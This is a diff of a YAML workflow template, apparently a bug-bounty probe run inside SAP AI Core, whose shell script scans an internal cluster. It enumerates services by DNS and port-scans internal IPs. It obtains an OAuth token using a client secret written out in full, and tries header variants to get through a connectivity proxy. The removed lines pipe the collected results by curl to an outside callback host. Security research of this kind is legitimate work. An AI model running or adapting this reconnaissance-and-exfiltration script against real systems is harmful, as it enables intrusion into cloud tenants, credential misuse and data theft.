@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-probe"
-    ai.sap.com/version: "43.0.0"
+    ai.sap.com/version: "44.0.0"
 spec:
   entrypoint: main
   templates:
@@ -25,78 +25,58 @@ spec:
       - -c
       - |
         CB="https://www.masonhck.tech/ssrf.php"
-        
-        # 1. Enumerate services in new namespaces
-        echo "=== ML-TRACKING ===" >&2
-        for svc in ml-tracking mlflow tracking experiment mltracking; do
-          ip=$(dig +short "${svc}.ml-tracking.svc.cluster.local" 2>/dev/null | head -1)
-          [ -n "$ip" ] && echo "FOUND: ${svc}.ml-tracking -> $ip" >&2
-        done
-        # Try common service names
-        for svc in server api gateway service web http; do
-          ip=$(dig +short "${svc}.ml-tracking.svc.cluster.local" 2>/dev/null | head -1)
-          [ -n "$ip" ] && echo "FOUND: ${svc}.ml-tracking -> $ip" >&2
-        done
-        
-        echo "=== USAGE-API ===" >&2
-        for svc in usage-api usage billing metering api server; do
-          ip=$(dig +short "${svc}.usage-api.svc.cluster.local" 2>/dev/null | head -1)
-          [ -n "$ip" ] && echo "FOUND: ${svc}.usage-api -> $ip" >&2
-        done
-        
-        echo "=== CONNECTIVITY-PROXY ===" >&2
-        for svc in connectivity-proxy proxy tunnel gateway; do
-          ip=$(dig +short "${svc}.connectivity-proxy.svc.cluster.local" 2>/dev/null | head -1)
-          [ -n "$ip" ] && echo "FOUND: ${svc}.connectivity-proxy -> $ip" >&2
-        done
-        
-        echo "=== OPENTELEMETRY ===" >&2
-        for svc in otel-collector collector opentelemetry jaeger; do
-          ip=$(dig +short "${svc}.opentelemetry.svc.cluster.local" 2>/dev/null | head -1)
-          [ -n "$ip" ] && echo "FOUND: ${svc}.opentelemetry -> $ip" >&2
-        done
-        
-        echo "=== DYNATRACE ===" >&2
-        for svc in dynatrace oneagent activegate; do
-          ip=$(dig +short "${svc}.dynatrace.svc.cluster.local" 2>/dev/null | head -1)
-          [ -n "$ip" ] && echo "FOUND: ${svc}.dynatrace -> $ip" >&2
-        done
-        
-        # 2. HTTP probe connectivity proxy endpoints
-        echo "=== CONN PROXY DEEP ===" >&2
         CP="100.104.7.43"
-        for port in 80 443 8080 8443 9090 20003 20004; do
-          R=$(curl -sk --connect-timeout 3 "http://${CP}:${port}/" 2>&1 | head -c 200)
-          [ -n "$R" ] && echo "PORT ${port}: $R" >&2
-        done
+        OTEL="100.109.242.36"
         
-        # Try with our OAuth token
+        # Get JWT (no Bearer prefix)
         AUTH_URL="https://cf-aicore-security-bb-14.authentication.eu10.hana.ondemand.com"
         CID="sb-aicore-bb-14!b627554|aicore-xsuaa-std!b563784"
         CSC='aicore-bb-14-key$HWyz9kltTGQqtpP0ZbBl-NPwng_aMxh8F2GaXyYiPRc='
         JWT=$(curl -sk -X POST "${AUTH_URL}/oauth/token" \
           -d "grant_type=client_credentials&client_id=${CID}&client_secret=${CSC}" 2>&1 | python3 -c "import json,sys; print(json.load(sys.stdin).get('access_token','FAIL'))" 2>/dev/null)
+        echo "JWT: ${#JWT} chars" >&2
         
-        echo "=== CONN PROXY WITH TOKEN ===" >&2
-        R=$(curl -sk --connect-timeout 5 \
-          -H "SAP-CP-Connectivity-Service-Token: Bearer $JWT" \
-          -H "Proxy-Authorization: Bearer $JWT" \
-          "http://${CP}:20003/" 2>&1 | head -c 300)
-        echo "20003+token: $R" >&2
+        # 1. Fix connectivity proxy token format
+        echo "=== CONN PROXY TOKEN TESTS ===" >&2
+        # No Bearer prefix - raw JWT in header
+        R1=$(curl -sk --connect-timeout 5 -H "SAP-CP-Connectivity-Service-Token: $JWT" "http://${CP}:20003/" 2>&1 | head -c 300)
+        echo "Raw JWT: $R1" >&2
         
-        # 3. Probe ml-tracking API
-        echo "=== ML-TRACKING PROBE ===" >&2
-        # MLflow default port is 5000
-        for port in 5000 80 8080 443; do
-          for host in "ml-tracking.ml-tracking.svc.cluster.local" "mlflow.ml-tracking.svc.cluster.local" "server.ml-tracking.svc.cluster.local"; do
-            R=$(curl -sk --connect-timeout 2 "http://${host}:${port}/" 2>&1 | head -c 200)
-            [ -n "$R" ] && [ "$R" != *"resolve"* ] && echo "${host}:${port}: $R" >&2
-          done
+        # Try different header combinations
+        R2=$(curl -sk --connect-timeout 5 -H "SAP-Connectivity-Authentication: Bearer $JWT" "http://${CP}:20003/" 2>&1 | head -c 300)
+        echo "SAP-Connectivity-Auth: $R2" >&2
+        
+        R3=$(curl -sk --connect-timeout 5 -H "Authorization: Bearer $JWT" "http://${CP}:20003/" 2>&1 | head -c 300)
+        echo "Authorization: $R3" >&2
+        
+        R4=$(curl -sk --connect-timeout 5 -H "SAP-CP-Connectivity-Service-Token: $JWT" -H "Proxy-Authorization: Bearer $JWT" "http://${CP}:20003/" 2>&1 | head -c 300)
+        echo "Both headers: $R4" >&2
+        
+        # 2. Probe OpenTelemetry collector
+        echo "=== OTEL COLLECTOR ===" >&2
+        for port in 4317 4318 8888 13133 55679 55680 14268 9411 1777; do
+          R=$(curl -sk --connect-timeout 2 "http://${OTEL}:${port}/" 2>&1 | head -c 200)
+          [ -n "$R" ] && echo "OTEL:${port}: $R" >&2
         done
         
-        # 4. Send all results via callback
-        # Capture stderr to file then send
-        exec 2>/tmp/results.txt
-        cat /tmp/results.txt | curl -s "${CB}?src=v43-results" --data-urlencode "d@-" > /dev/null 2>/dev/null
+        # Try OTEL health/metrics
+        for path in "/v1/traces" "/v1/metrics" "/v1/logs" "/metrics" "/health" "/debug/pprof"; do
+          R=$(curl -sk --connect-timeout 2 "http://${OTEL}:4318${path}" 2>&1 | head -c 200)
+          [ -n "$R" ] && echo "OTEL:4318${path}: $R" >&2
+        done
         
-        echo "V43 DONE"
+        # Try gRPC port
+        R=$(curl -sk --connect-timeout 2 "http://${OTEL}:4317/" 2>&1 | head -c 100)
+        echo "OTEL:4317: $R" >&2
+        
+        # 3. DNS wildcard search for ml-tracking
+        echo "=== ML-TRACKING DEEP ===" >&2
+        for svc in ml-tracking-server ml-tracking-api mlflow-server tracking-server experiment-tracking sap-ml-tracking ai-tracking; do
+          ip=$(dig +short "${svc}.ml-tracking.svc.cluster.local" 2>/dev/null | head -1)
+          [ -n "$ip" ] && echo "FOUND: ${svc}.ml-tracking -> $ip" >&2
+        done
+        
+        # SRV records
+        dig +short SRV "*.ml-tracking.svc.cluster.local" 2>/dev/null | head -5 >&2
+        
+        echo "V44 DONE" >&2
